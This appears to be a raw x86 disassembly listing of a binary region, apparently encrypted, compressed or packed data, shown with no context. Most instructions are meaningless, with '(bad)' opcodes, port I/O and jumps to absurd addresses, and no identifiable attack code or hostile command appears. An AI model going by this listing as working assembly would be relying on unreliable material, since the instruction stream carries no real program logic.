  410edb:	fs pushf 
  410edd:	icebp  
  410ede:	or     ebp,eax
	...
  410eec:	add    BYTE PTR [eax],al
  410eee:	add    BYTE PTR [ebx-0x1],ch
  410ef1:	mov    ah,0xfe
  410ef3:	mov    WORD PTR [ecx],ss
  410ef5:	adc    bh,bh
  410ef7:	push   cs
  410ef8:	mov    ah,0xaa
  410efa:	dec    edx
  410efb:	add    DWORD PTR [edi-0x7fe1774c],edx
  410f01:	mov    ah,0x74
  410f03:	push   edi
  410f04:	xchg   DWORD PTR [esi],ebp
  410f06:	or     BYTE PTR [ebx-0x34],bh
  410f09:	and    bh,bh
  410f0b:	pop    esp
  410f0c:	aaa    
  410f0d:	das    
  410f0e:	adc    al,0x54
  410f10:	mov    ecx,0xba66e80a
  410f15:	mov    bl,0xfe
  410f17:	fisubr DWORD PTR [eax-0x46]
  410f1a:	(bad)  
  410f1b:	mov    dh,0xb0
  410f1d:	mov    bl,0x74
  410f1f:	imul   eax,DWORD PTR [ebp+ebp*4+0x60],0x2c
  410f24:	inc    edi
  410f25:	mov    ch,0x74
  410f27:	dec    edi
  410f28:	out    dx,eax
  410f29:	or     BYTE PTR cs:[ebx],cl
  410f2c:	aad    0x20
  410f2e:	call   DWORD PTR [ebx+eiz*1]
  410f31:	aas    
  410f32:	adc    al,0xe0
  410f34:	mov    ds:0x1b577402,eax
  410f39:	aaa    
  410f3a:	cld    
  410f3b:	outs   dx,BYTE PTR ds:[esi]
  410f3c:	nop
  410f3d:	add    eax,0xff007683
  410f42:	jae    0x410fa8
  410f44:	rol    edx,cl
  410f46:	pop    esi
  410f47:	sbb    bl,dl
  410f49:	sldt   WORD PTR [edx]
  410f4c:	xor    BYTE PTR ds:0xac0d6341,bl
  410f52:	cmp    BYTE PTR [eax],al
	...
  410f60:	add    BYTE PTR [eax],al
  410f62:	es add eax,0xda5c2de1
  410f68:	test   al,0x54
  410f6a:	stos   BYTE PTR es:[edi],al
  410f6b:	ret    0x3fc
  410f6e:	loopne 0x410f9f
  410f70:	int    0xfe
  410f72:	aaa    
  410f73:	inc    ebp
  410f75:	cs dec edi
  410f77:	scas   al,BYTE PTR es:[edi]
  410f78:	xor    ecx,DWORD PTR [ebx+ecx*4]
  410f7b:	add    DWORD PTR [edi-0x4b],0xffffff95
  410f7f:	jnp    0x410fa4
  410f81:	int3   
  410f82:	add    al,0x5
  410f84:	jmp    0xe5de728b
  410f89:	sbb    al,0x7c
  410f8b:	lods   eax,DWORD PTR ds:[esi]
  410f8c:	pop    edi
  410f8d:	outs   dx,DWORD PTR ds:[esi]
  410f8f:	(bad)  [ebp-0x451ad58]
  410f95:	pcmpgtb mm6,QWORD PTR [edi]
  410f98:	icebp  
  410f99:	stos   DWORD PTR es:[edi],eax
  410f9a:	out    dx,al
  410f9b:	es jbe 0x410f52
  410f9e:	jmp    0x60cb84f5
  410fa3:	outs   dx,DWORD PTR ds:[esi]
  410fa4:	lods   eax,DWORD PTR ds:[esi]
  410fa5:	clc    
  410fa6:	(bad)  
  410fa7:	lods   eax,DWORD PTR ds:[esi]
  410fa8:	fisubr DWORD PTR [edx-0x7f02bd17]
  410fae:	ins    BYTE PTR es:[edi],dx
  410faf:	add    eax,0x332c04d4
  410fb4:	cmp    eax,0x3e2422ab
  410fb9:	mov    ah,0x49
  410fbb:	lds    edx,FWORD PTR [ebp-0x16eddd36]
  410fc1:	or     BYTE PTR [edi+0x4eba9],0x0
	...
  410fd4:	add    dh,bl
  410fd6:	fs call 0x162172df
  410fdc:	test   al,0x86
  410fde:	xor    BYTE PTR [ebx+0x4301d9af],0x0
  410fe5:	sahf   
  410fe6:	mov    ch,0x92
  410fe8:	add    esi,DWORD PTR [ebx]
  410fea:	lods   al,BYTE PTR ds:[esi]
  410feb:	(bad)  
  410fec:	jnp    0x411056
  410fee:	popf   
  410fef:	daa    
  410ff0:	(bad)  
  410ff1:	pop    ss
  410ff2:	lods   al,BYTE PTR ds:[esi]
  410ff3:	(bad)  
  410ff4:	pop    esp
  410ff5:	imul   ebp,DWORD PTR [esp+esi*2+0x6116d8f1],0xffffffd6
  410ffd:	lock jge 0x411044
  411000:	popf   
  411001:	dec    ebp
  411002:	add    eax,0xac4b3cff
  411007:	je     0x410ffa
  411009:	clc    
  41100a:	cmp    eax,0x7fd0b6f8
  41100f:	dec    esp
  411010:	aad    0xe5
  411012:	in     eax,dx
  411013:	call   FWORD PTR [ebx]
  411015:	pusha  
  411016:	lods   al,BYTE PTR ds:[esi]
  411017:	je     0x410fae
  411019:	fistp  WORD PTR [edx]
  41101b:	xchg   si,ax
  41101d:	mov    al,0xdf
  41101f:	mov    edi,0x13c6ae2e
  411024:	jmp    0x7e5941da
  411029:	call   0x74ab:0x14fcff11
  411030:	fst    QWORD PTR [ecx]
  411032:	xor    DWORD PTR [eax],ecx
  411034:	push   ecx
  411035:	in     al,dx
  411036:	test   eax,0x5efe
	...
  411047:	add    BYTE PTR [esp+ebp*2],bh
  41104a:	je     0x411032
  41104c:	icebp  
  41104d:	xor    ah,dh
  41104f:	inc    ecx
  411050:	cwde   
  411051:	and    edi,edi
  411053:	inc    esi
  411054:	add    al,0x6c
  411056:	pop    esi
  411057:	xor    BYTE PTR ds:0x5ae0018,ah
  41105d:	sub    eax,edi
  41105f:	mov    ebx,0x174aae3
  411064:	shl    BYTE PTR [eax],1
  411066:	adc    al,0x1e
  411068:	cmp    bh,BYTE PTR [ebp-0x550b6302]
  41106e:	je     0x411051
  411070:	enter  0xfe21,0x0
  411074:	pop    ebp
  411075:	js     0x411080
  411077:	ror    ch,0x7c
  41107a:	push   eax
  41107b:	add    edx,ecx
  41107d:	pop    es
  41107e:	push   DWORD PTR [ebp-0x2a]
  411081:	(bad)  
  411082:	adc    al,0x66
  411084:	mov    ebp,0x7dc02976
  411089:	push   0xffffffc0
  41108b:	adc    al,0xca
  41108d:	mov    BYTE PTR [ecx+eax*1],bh
  411090:	mov    edx,0x9e7d8307
  411095:	add    al,0xf
  411097:	test   DWORD PTR [esi+0x61000000],edx
  41109d:	js     0x411086
  41109f:	and    al,0x7b
  4110a1:	pop    es
  4110a2:	add    BYTE PTR [ebx+0x4896d47],cl
  4110a8:	add    BYTE PTR [ebx],al
  4110aa:	inc    ebp
  4110ab:	lock add BYTE PTR [eax],al
	...
  4110ba:	add    BYTE PTR [eax+0x1],ah
  4110bd:	push   eax
  4110be:	call   DWORD PTR [edi-0x57]
  4110c1:	out    0x74,al
  4110c3:	aas    
  4110c4:	js     0x4110c3
  4110c6:	push   0x4a
  4110c8:	js     0x41113d
  4110ca:	adc    al,0xcd
  4110cc:	in     eax,dx
  4110cd:	pop    es
  4110ce:	call   0x3e806c
  4110d3:	rol    DWORD PTR [ebp+0x14],1
  4110d6:	add    DWORD PTR [ebx-0x72f08aff],0xffffffed
  4110dd:	repz call 0x3fee65
  4110e3:	push   ecx
  4110e4:	rcr    DWORD PTR [ebp-0x37],0x48
  4110e8:	adc    al,BYTE PTR [eax]
  4110ea:	or     edi,DWORD PTR [eax-0xe]
  4110ed:	add    al,0xe9
  4110ef:	dec    esi
  4110f0:	push   es
  4110f1:	add    BYTE PTR [eax],al
  4110f3:	xchg   ebx,eax
  4110f4:	cmp    eax,0x780a6aec
  4110f9:	jae    0x41110f
  4110fb:	arpl   WORD PTR [ebx],dx
  4110fd:	cmp    BYTE PTR [eax],cl
  4110ff:	sti    
  411100:	(bad)  
  411101:	mov    ecx,0x4037e4fe
  411106:	adc    al,0xe0
  411108:	lds    eax,FWORD PTR [edx]
  41110a:	jne    0x411170
  41110c:	mov    bl,0x36
  41110e:	hlt    
  41110f:	mov    ebx,0xc4ff2854
  411114:	pop    ss
  411115:	les    ebx,FWORD PTR [esi-0x56]
  411118:	pop    esi
  411119:	pop    ss
  41111a:	add    BYTE PTR [ecx+ecx*1+0x6638],dh
	...
  41112d:	add    BYTE PTR [edx],ah
  41112f:	pushf  
  411130:	jg     0x411176
  411132:	mov    ebx,0xe0e84737
  411137:	aam    0xff
  411139:	rol    BYTE PTR [ebx-0x352e2467],0x5b
  411140:	add    eax,DWORD PTR [eax]
  411142:	arpl   WORD PTR [ebx-0x4c747d4e],cx
  411148:	jns    0x41118e
  41114a:	sbb    DWORD PTR [edi],0x1f
  41114d:	call   0xec883892
  411152:	sub    cl,bl
  411154:	fwait
  411155:	jbe    0x4111b8
  411157:	xchg   edi,eax
  411158:	fisubr DWORD PTR [edx]
  41115a:	xor    DWORD PTR [edi],esp
  41115c:	inc    edi
  41115d:	in     al,dx
  41115e:	js     0x411141
  411160:	mov    ds:0x8554968a,eax
  411165:	rol    BYTE PTR [eax+0x2c039b1f],0x4d
  41116c:	add    eax,0x57254355
  411171:	in     al,0xd8
  411173:	pop    eax
  411174:	call   0xe805:0x3540a63a
  41117b:	pop    eax
  41117c:	mov    ds:0x472760ea,al
  411181:	in     al,0x4
  411183:	add    eax,0x2ffc179c
  411188:	or     eax,0xe12ff454
  41118d:	fwait
  41118e:	ret    
  41118f:	mov    cl,0xd
  411191:	mov    cl,0x0
	...
  41119f:	add    BYTE PTR [eax],al
  4111a1:	pop    ecx
  4111a2:	lds    edi,FWORD PTR [ebx+0x0]
  4111a5:	fsubr  QWORD PTR [edi]
  4111a7:	cmc    
  4111a8:	fwait
  4111a9:	jbe    0x4111cb
  4111ab:	div    BYTE PTR [eax-0x45723a87]
  4111b1:	mov    ds:0x277ae910,al
  4111b6:	leave  
  4111b7:	jno    0x41118c
  4111b9:	out    0x3f,eax
  4111bb:	mov    ebp,0xb13fde53
  4111c0:	push   ebx
  4111c1:	adc    DWORD PTR [ebp-0x5662539e],ebx
  4111c7:	outs   dx,DWORD PTR ds:[esi]
  4111c8:	inc    esi
  4111c9:	mov    bl,0xa9
  4111cb:	cmp    edx,eax
  4111cd:	test   BYTE PTR [edx],ah
  4111cf:	or     eax,0x238585b1
  4111d4:	aam    0x7c
  4111d6:	xor    eax,0xccf784fc
  4111db:	call   0x13eb6617
  4111e0:	fsub   DWORD PTR [ebp+0x2f]
  4111e3:	mov    eax,ds:0x7df9d7b0
  4111e8:	imul   ebp,DWORD PTR ss:[eax+0x334c0c1b],0xffffff91
  4111f0:	fwait
  4111f1:	bound  ebp,QWORD PTR [ebp+eiz*2-0x24135a50]
  4111f8:	stos   DWORD PTR es:[edi],eax
  4111f9:	cmp    DWORD PTR gs:[ecx],0xffffffb1
  4111fd:	sub    eax,0x2f364da9
  411202:	sahf   
  411203:	sub    al,0x27
	...
  411211:	add    BYTE PTR [eax],al
  411213:	add    BYTE PTR [ecx+ebp*4],bl
  411216:	add    BYTE PTR [edx],0x63
  411219:	add    eax,0xbeb3e900
  41121e:	rcl    ebp,0x60
  411221:	push   edx
  411222:	mov    edx,DWORD PTR ds:0xf174a89b
  411228:	fdiv   DWORD PTR [ecx+esi*2-0x46df4cea]
  41122f:	stos   BYTE PTR es:[edi],al
  411230:	mov    eax,ds:0xd87cff05
  411235:	mov    al,ds:0x560b63c
  41123a:	or     ebp,DWORD PTR [ecx]
  41123c:	xchg   ebp,eax
  41123d:	add    bl,BYTE PTR [edi+0x20]
  411240:	sahf   
  411241:	add    BYTE PTR [eax],al
  411243:	scas   eax,DWORD PTR es:[edi]
  411244:	addr16 add eax,0xa0b754ff
  41124a:	rcr    BYTE PTR [ebx-0x4],cl
  41124d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41124e:	mov    esi,0x462092
  411253:	(bad)  
  411254:	pop    edx
  411255:	std    
  411256:	push   esi
  411257:	rcr    DWORD PTR [esi-0x11],1
  41125a:	(bad)  
  41125b:	call   0xe4b57ae9
  411260:	adc    eax,0x60f1c1be
  411265:	test   eax,0xa706a932
  41126a:	(bad)  
  41126b:	xchg   esi,eax
  41126c:	mov    esp,0x5dd1adb6
  411271:	xor    ah,al
  411273:	xchg   BYTE PTR [edx+0x5e7fd],bl
	...
  411285:	add    BYTE PTR [eax],al
  411287:	pop    edx
  411288:	test   al,0xfe
  41128a:	loop   0x4112ac
  41128c:	xor    DWORD PTR ds:0x7c6060e,eax
  411292:	jmp    0xa883aeef
  411297:	pusha  
  411298:	test   al,0x74
  41129a:	loope  0x411264
  41129c:	mov    ebx,0xfc60e934
  4112a1:	mov    edi,0xfda8df00
  4112a6:	jne    0x4112ae
  4112a8:	daa    
  4112a9:	add    al,0x7c
  4112ab:	sbb    al,0x41
  4112ad:	add    BYTE PTR [eax+0x4c],ch
  4112b0:	inc    esp
  4112b1:	inc    ecx
  4112b2:	add    BYTE PTR [ebp-0x12],al
  4112b5:	pop    es
  4112b6:	call   0x3fc153
  4112bb:	add    esp,eax
  4112bd:	jae    0x4112c8
  4112bf:	push   ebp
  4112c0:	out    dx,al
  4112c1:	or     ecx,DWORD PTR [edi+0x416483cf]
  4112c7:	retf   0x50b
  4112ca:	inc    esp
  4112cb:	sti    
  4112cc:	add    edi,edi
  4112ce:	jne    0x411292
  4112d0:	mov    edx,DWORD PTR [esi+0xb03ca35]
  4112d6:	ror    BYTE PTR [edi],0xaa
  4112d9:	std    
  4112da:	jne    0x4112a2
  4112dc:	es add al,0x84
  4112df:	sbb    al,0x42
  4112e1:	add    BYTE PTR [eax+0x38b],bh
  4112e7:	jne    0x411353
  4112e9:	ror    BYTE PTR [eax],0x0
	...
  4112f8:	add    BYTE PTR [eax],al
  4112fa:	jp     0x411348
  4112fc:	mov    ebp,esp
  4112fe:	stc    
  4112ff:	mov    edi,0x93d56f2
  411304:	mov    ch,0x43
  411306:	dec    ebx
  411307:	add    edi,edi
  411309:	jne    0x41128d
  41130b:	mov    eax,DWORD PTR [esi+esi*1-0x3ff4fc86]
  411312:	pop    edi
  411313:	add    DWORD PTR [edi+0x5e],ebx
  411316:	adc    eax,ebp
  411318:	add    al,BYTE PTR [eax]
  41131a:	jp     0x411346
  41131c:	out    dx,eax
  41131d:	mov    esi,DWORD PTR [edi]
  41131f:	stos   DWORD PTR es:[edi],eax
  411320:	jmp    0x3cc40126
  411325:	add    BYTE PTR [edi],cl
  411327:	pop    ebp
  411328:	mov    ds:0x41876368,al
  41132d:	inc    ecx
  41132e:	arpl   WORD PTR [edi],si
  411330:	cmp    BYTE PTR [eax],cl
  411332:	or     edi,DWORD PTR [ebp-0x4beb000c]
  411338:	ret    0x6574
  41133b:	(bad)  
  41133c:	dec    esp
  41133d:	leave  
  41133e:	and    DWORD PTR [ecx-0x4b8174fe],esp
  411344:	cdq    
  411345:	and    ebx,esp
  411347:	(bad)  
  411348:	sti    
  411349:	jae    0x411395
  41134b:	sbb    al,0xee
  41134d:	or     al,0x6f
  41134f:	mov    al,0x82
  411351:	imul   ebp,DWORD PTR ds:[eax],0x63947ffe
  411358:	ss or  ah,bl
  41135b:	outs   dx,DWORD PTR ds:[esi]
  41135c:	dec    edi
  41135d:	je     0x41135f
	...
  41136b:	add    BYTE PTR [eax],al
  41136d:	pop    esi
  41136e:	sbb    al,0xee
  411370:	pop    edi
  411371:	ss fwait
  411373:	les    eax,FWORD PTR [esi]
  411375:	sbb    edi,0xffffff83
  411378:	arpl   WORD PTR ds:[ecx-0x35],cx
  41137c:	(bad)  
  41137d:	push   ds
  41137e:	mov    eax,0x9c630003
  411383:	ret    
  411384:	inc    esp
  411385:	fwait
  411386:	pushf  
  411387:	add    al,BYTE PTR [eax]
  411389:	arpl   WORD PTR [ebx],sp
  41138b:	das    
  41138c:	or     BYTE PTR [eax-0x1d],bh
  41138f:	cmp    DWORD PTR [esi],0x44
  411392:	or     ecx,ebx
  411394:	xor    dh,0x87
  411397:	add    esi,DWORD PTR [ebp+0x51]
  41139a:	xchg   DWORD PTR [esi-0x8],eax
  41139d:	bound  ebx,QWORD PTR [edx+eax*1-0x3c5f2a00]
  4113a4:	inc    esp
  4113a5:	push   edi
  4113a6:	popf   
  4113a7:	add    al,BYTE PTR [eax]
  4113a9:	arpl   WORD PTR [ebx+0x349ef710],ax
  4113af:	add    eax,DWORD PTR [eax]
  4113b1:	arpl   WORD PTR ds:0xbf6936e9,ax
  4113b7:	in     eax,0xe3
  4113b9:	and    eax,0x63045540
  4113be:	add    eax,0x495d83e9
  4113c3:	mov    esp,0x41401406
  4113c8:	cdq    
  4113c9:	gs mov esi,0xa604abab
  4113cf:	call   0x4113d7
	...
  4113e0:	loopne 0x411409
  4113e2:	and    eax,0x27026e03
  4113e7:	add    eax,0xed693e43
  4113ec:	in     al,0x30
  4113ee:	pop    ecx
  4113ef:	jns    0x411450
  4113f1:	std    
  4113f2:	adc    DWORD PTR [eax],edx
  4113f4:	jecxz  0x4113db
  4113f6:	enter  0x7536,0x85
  4113fa:	jne    0x4113fe
  4113fc:	xor    DWORD PTR [eax],0xffffffd9
  4113ff:	push   esp
  411400:	enter  0x72fe,0x44
  411404:	bound  edi,QWORD PTR [ebp-0x1b]
  411407:	inc    esp
  411408:	jecxz  0x4113ef
  41140a:	call   0x1e86c245
  41140f:	inc    ebp
  411410:	jecxz  0x4113f7
  411412:	call   0x23fec84d
  411417:	mov    eax,0x3e8a58c
  41141c:	fsubr  DWORD PTR [edi]
  41141e:	loope  0x411498
  411420:	(bad)  
  411421:	cld    
  411422:	xchg   ecx,eax
  411423:	loope  0x411419
  411425:	in     eax,0xcc
  411427:	ss dec edi
  411429:	mov    edi,0x2f6403ed
  41142e:	xchg   ebp,eax
  41142f:	push   ebp
  411430:	dec    ebx
  411431:	icebp  
  411432:	xchg   BYTE PTR [ebp+edx*2+0x6536a911],ch
  411439:	inc    esp
  41143a:	add    BYTE PTR [edi],dl
  41143c:	or     bh,al
  41143e:	add    ebp,ecx
  411440:	mov    ebx,0x66459b
	...
  411451:	add    BYTE PTR [eax],al
  411453:	popf   
  411454:	cdq    
  411455:	inc    esi
  411456:	imul   edi,DWORD PTR [edi],0xf73073a5
  41145c:	sbb    esp,esi
  41145e:	mov    bh,0xf8
  411460:	adc    dh,bh
  411462:	inc    esi
  411463:	mov    DWORD PTR [ebx+0x5e],0x92230
  41146a:	pushf  
  41146b:	mov    esi,DWORD PTR [eax+0x3ab82582]
  411471:	push   edi
  411472:	push   0x45
  411474:	stc    
  411475:	call   DWORD PTR [ecx+ebp*8+0x9e03c87]
  41147c:	inc    esi
  41147d:	add    cl,ch
  41147f:	xchg   ebp,eax
  411480:	or     ebx,DWORD PTR [edi-0x59]
  411483:	sbb    edi,eax
  411485:	psubsw mm1,QWORD PTR [ebx+0x49]
  411489:	adc    al,0xb0
  41148b:	pop    ebp
  41148c:	and    DWORD PTR [esi-0x58],esp
  41148f:	pusha  
  411490:	adc    al,0x83
  411492:	mov    bl,BYTE PTR [esi+0x5]
  411495:	add    BYTE PTR [eax],ah
  411497:	bound  eax,QWORD PTR [ebp+0x145f2865]
  41149d:	xor    DWORD PTR [esi+0x66],0x5
  4114a1:	add    BYTE PTR [eax],al
  4114a3:	bound  ecx,QWORD PTR [ecx+0x14672865]
  4114a9:	and    DWORD PTR [edx+0x5e],0x5
  4114ad:	add    BYTE PTR [edx+eiz*1-0x67],bl
  4114b1:	dec    edi
  4114b2:	je     0x4114d6
  4114b4:	popf   
  4114b5:	dec    edi
  4114b6:	ins    BYTE PTR es:[edi],dx
	...
  4114c3:	add    BYTE PTR [eax],al
  4114c5:	add    BYTE PTR [edx],ah
  4114c7:	mov    eax,ds:0x2072964f
  4114cc:	data16 sub BYTE PTR [edi-0x5c],ah
  4114d0:	je     0x4114d2
  4114d2:	cmp    al,BYTE PTR [eax+0x70cdf8bc]
  4114d8:	mov    eax,DWORD PTR [ebp-0x1e]
  4114db:	cmp    BYTE PTR [ebp-0x72c641bb],cl
  4114e1:	inc    ebp
  4114e2:	call   0x40e7:0xc635ff39
  4114e9:	add    BYTE PTR [ebp-0x1917f02a],cl
  4114ef:	jo     0x4114ee
  4114f1:	dec    DWORD PTR [edi+0x7f50dc46]
  4114f7:	inc    esi
  4114f8:	loopne 0x41154a
  4114fa:	jg     0x411542
  4114fc:	in     al,0x50
  4114fe:	dec    ebp
  4114ff:	xchg   esi,eax
  411500:	jle    0x411568
  411502:	retf   
  411503:	pop    es
  411504:	push   DWORD PTR [ebp-0x16]
  411507:	jg     0x411491
  411509:	clc    
  41150a:	dec    ebp
  41150b:	jo     0x41150a
  41150d:	jne    0x411575
  41150f:	and    BYTE PTR [esp+edx*8+0x5d],al
  411513:	(bad)  
  411514:	fisttp DWORD PTR [edi+0x45c5d007]
  41151a:	push   0x9
  41151c:	add    BYTE PTR [eax],al
  41151e:	retf   0x441c
  411521:	int3   
  411522:	jp     0x411527
  411524:	add    DWORD PTR [edx-0x46],ebp
  411527:	add    DWORD PTR [eax],eax
  411529:	push   0x0
	...
  411537:	add    BYTE PTR [eax],al
  411539:	mov    edx,0x478d0001
  41153e:	mov    ch,0x4e
  411540:	push   DWORD PTR [edi+0x7a4127a0]
  411546:	mov    ds:0xa1f60fbe,al
  41154b:	(bad)  
  41154c:	dec    DWORD PTR [edx-0x752f8476]
  411552:	sahf   
  411553:	add    BYTE PTR [eax],0x7b
  411556:	pop    es
  411557:	add    BYTE PTR [ebx+0x3ab7e963],cl
  41155d:	scas   al,BYTE PTR es:[edi]
  41155e:	mov    cl,bh
  411560:	xchg   BYTE PTR [edi-0x53],cl
  411563:	add    al,BYTE PTR [eax]
  411565:	dec    edi
  411566:	sbb    BYTE PTR [eax],dh
  411568:	rcr    al,1
  41156a:	cdq    
  41156b:	(bad)  
  41156c:	mov    ch,BYTE PTR [esi+0x3001a580]
  411572:	xchg   ecx,eax
  411573:	test   eax,0x40341f74
  411578:	in     al,0x24
  41157a:	ret    0xe7d2
  41157d:	cmp    al,0xff
  41157f:	add    eax,DWORD PTR [eax]
  411581:	loopne 0x41154c
  411583:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411584:	call   FWORD PTR [ebp+0x28]
  411587:	mov    ecx,0x85ad04ff
  41158c:	jl     0x411581
  41158e:	lods   al,BYTE PTR ds:[esi]
  41158f:	stc    
  411590:	sbb    DWORD PTR [edi],0xffffffad
  411593:	add    al,BYTE PTR [eax]
  411595:	loopne 0x411518
  411597:	sahf   
  411598:	call   DWORD PTR [ebp+0x30]
  41159b:	ins    DWORD PTR es:[edi],dx
  41159c:	inc    DWORD PTR [eax]
	...
  4115aa:	add    BYTE PTR [eax],al
  4115ac:	fsubr  QWORD PTR [ecx+ebp*4+0x6cf4d774]
  4115b3:	pusha  
  4115b4:	int3   
  4115b5:	mov    ds:0x9b9b447a,eax
  4115ba:	cs cld 
  4115bc:	mov    esp,0x2efebb19
  4115c1:	rcr    BYTE PTR [ebx-0x573cbd21],0x67
  4115c8:	dec    edi
  4115c9:	lock inc edx
  4115cb:	add    BYTE PTR [ebx-0x6b0009c0],cl
  4115d1:	cld    
  4115d2:	sbb    edx,DWORD PTR [edi+eiz*1]
  4115d5:	in     eax,dx
  4115d6:	add    edi,edi
  4115d8:	push   cs
  4115d9:	fs fwait
  4115db:	sub    eax,0xb02ac37
  4115e0:	mov    ds:0xfb0c1d05,eax
  4115e5:	std    
  4115e6:	and    al,0x43
  4115e8:	arpl   WORD PTR [ebp-0x5da309e8],bp
  4115ee:	cmp    BYTE PTR [eax+edi*2],bl
  4115f1:	dec    ecx
  4115f2:	sub    BYTE PTR [esp+ecx*2],al
  4115f5:	sbb    BYTE PTR [ecx-0x17268d64],dh
  4115fb:	add    ebp,DWORD PTR [eax-0x3b]
  4115fe:	hlt    
  4115ff:	or     ecx,ebx
  411601:	out    0xac,al
  411603:	inc    edx
  411604:	arpl   WORD PTR [ebp-0x5ddb0a4c],bp
  41160a:	mov    eax,0xa849401b
  41160f:	add    eax,DWORD PTR [eax]
	...
  41161d:	add    BYTE PTR [eax],al
  41161f:	adc    al,0x18
  411621:	xor    DWORD PTR [esi+edx*1+0x5803e8d6],ebx
  411628:	lds    edi,FWORD PTR [ebx-0x16fa74c2]
  41162e:	cwde   
  41162f:	mov    dh,0xa1
  411631:	fwait
  411632:	test   DWORD PTR [edi+ebx*2],0xa1e5a8bb
  411639:	fld    TBYTE PTR [ebx]
  41163b:	inc    ebp
  41163c:	inc    esp
  41163d:	jmp    0x115265ea
  411642:	pop    eax
  411643:	das    
  411644:	mov    ds:0xa14fa8fd,al
  411649:	cmc    
  41164a:	cs mov bh,0xa1
  41164d:	jae    0x411646
  41164f:	mov    esp,0xada943b8
  411654:	mov    eax,ds:0x17a5b453
  411659:	shr    DWORD PTR [eax-0x3e3eeee9],0x37
  411660:	mov    ds:0xa917a8c5,al
  411665:	mov    ebp,0xffa1a72e
  41166a:	cmp    edi,DWORD PTR [ebx-0x57]
  41166d:	mov    bh,0xc
  41166f:	retf   0xfea2
  411672:	sbb    al,0xaf
  411674:	test   eax,0xa2ba09f0
  411679:	pop    esi
  41167a:	aaa    
  41167b:	sbb    bh,al
  41167d:	psubsw mm4,QWORD PTR [ebp+0x6aeb8c]
	...
  411690:	add    BYTE PTR [eax],al
  411692:	or     al,0xa9
  411694:	cmp    ah,0x54
  411697:	or     cl,BYTE PTR [edi]
  411699:	ins    BYTE PTR es:[edi],dx
  41169a:	push   edi
  41169b:	push   es
  41169c:	add    cl,ch
  41169e:	lods   eax,DWORD PTR ds:[esi]
  41169f:	dec    ecx
  4116a0:	hlt    
  4116a1:	mov    ecx,0xb9f849b5
  4116a6:	lods   eax,DWORD PTR ds:[esi]
  4116a7:	dec    ecx
  4116a8:	cld    
  4116a9:	mov    ecx,0xd4ff037e
  4116ae:	jo     0x41165d
  4116b0:	and    BYTE PTR [esi],bh
  4116b2:	mov    ebx,0xb8bc829f
  4116b7:	add    eax,0xa0b76c0f
  4116bc:	(bad)  
  4116bd:	jmp    0x7735308d
  4116c2:	sub    eax,0x9f056795
  4116c7:	inc    esi
  4116c8:	add    BYTE PTR [esi],dl
  4116ca:	lea    edx,[ebp-0x5f313c19]
  4116d0:	(bad)  
  4116d1:	repnz mov al,ds:0x6021850f
  4116d7:	add    eax,0x997d6400
  4116dc:	dec    edi
  4116dd:	pop    esp
  4116de:	jne    0x41167d
  4116e0:	dec    edi
  4116e1:	je     0x411705
  4116e3:	mov    eax,ds:0xa05f534f
  4116e8:	je     0x4116e3
  4116ea:	clc    
  4116eb:	stos   BYTE PTR es:[edi],al
  4116ec:	cmc    
  4116ed:	into   
  4116ee:	mov    esp,0xa2007c83
  4116f3:	or     cl,BYTE PTR [edi]
  4116f5:	test   DWORD PTR [eax],eax
	...
  411703:	add    BYTE PTR [eax],al
  411705:	loop   0x411710
  411707:	add    BYTE PTR [eax],al
  411709:	mov    ch,0xd6
  41170b:	repz push 0x4143f5
  411711:	rcr    BYTE PTR [edx-0x6485ffd0],cl
  411717:	mov    esi,0xff24cf0f
  41171c:	dec    DWORD PTR [edx+0x1d]
  41171f:	inc    esp
  411720:	hlt    
  411721:	push   0x1e
  411723:	inc    esp
  411724:	clc    
  411725:	push   0x1e
  411727:	inc    esp
  411728:	cld    
  411729:	pop    edx
  41172a:	sti    
  41172b:	add    bh,bh
  41172d:	das    
  41172e:	hlt    
  41172f:	out    0xb1,eax
  411731:	mov    WORD PTR [eax-0x3],gs
  411734:	add    DWORD PTR [edi],0x6c
  411737:	dec    BYTE PTR [esi]
  411739:	pop    DWORD PTR [esi+edi*8+0x441b0aff]
  411740:	hlt    
  411741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411742:	cdq    
  411743:	lea    eax,[ebp-0x6a]
  411746:	push   ds
  411747:	inc    esp
  411748:	hlt    
  411749:	ficomp DWORD PTR [esp+eax*2]
  41174c:	clc    
  41174d:	ficomp DWORD PTR [esp+eax*2]
  411750:	cld    
  411751:	stos   BYTE PTR es:[edi],al
  411752:	std    
  411753:	add    edi,edi
  411755:	iret   
  411756:	repz out 0x89,eax
  411759:	jl     0x4117c3
  41175b:	std    
  41175c:	and    edi,0x6b
  41175f:	push   DWORD PTR [ebp+eax*1+0x5f]
  411763:	add    edi,DWORD PTR [esp+ebx*8+0x48]
  411767:	add    bh,bh
	...
  411775:	add    BYTE PTR [eax],al
  411777:	add    BYTE PTR [ebp-0x4038029a],dh
  41177d:	and    DWORD PTR [ecx+eax*2-0x46],0x66
  411782:	std    
  411783:	inc    DWORD PTR [ebp+0x6384035e]
  411789:	push   eax
  41178a:	inc    ebp
  41178b:	add    BYTE PTR [esi+ecx*8-0x1f73015b],dl
  411792:	scas   eax,DWORD PTR es:[edi]
  411793:	out    0x61,eax
  411795:	bound  esp,QWORD PTR [ebp-0x640f5b02]
  41179b:	add    BYTE PTR [ebx-0x52],ah
  41179e:	add    al,BYTE PTR [ebx+0x411dea2e]
  4117a4:	arpl   WORD PTR [edi+0x2e],di
  4117a7:	sub    eax,esp
  4117a9:	mov    ecx,0xaca26582
  4117ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117af:	jae    0x411734
  4117b1:	sub    ebp,eax
  4117b3:	cmp    DWORD PTR [ebp-0x4800fc13],0xffffffbf
  4117ba:	sbb    dh,al
  4117bc:	out    dx,al
  4117bd:	in     al,dx
  4117be:	add    ecx,DWORD PTR [ebp-0xaccb5a]
  4117c4:	scas   al,BYTE PTR es:[edi]
  4117c5:	push   eax
  4117c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117c7:	je     0x411838
  4117c9:	aaa    
  4117ca:	xor    BYTE PTR [eax],cl
  4117cc:	or     esp,DWORD PTR [ebp-0x29f30156]
  4117d2:	ror    BYTE PTR [edi],0x63
  4117d5:	jns    0x411850
  4117d7:	jmp    0x4117b9
  4117d9:	lock xchg esi,eax
  4117db:	inc    BYTE PTR [eax]
	...
  4117e9:	add    BYTE PTR [eax],al
  4117eb:	outs   dx,BYTE PTR ds:[esi]
  4117ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
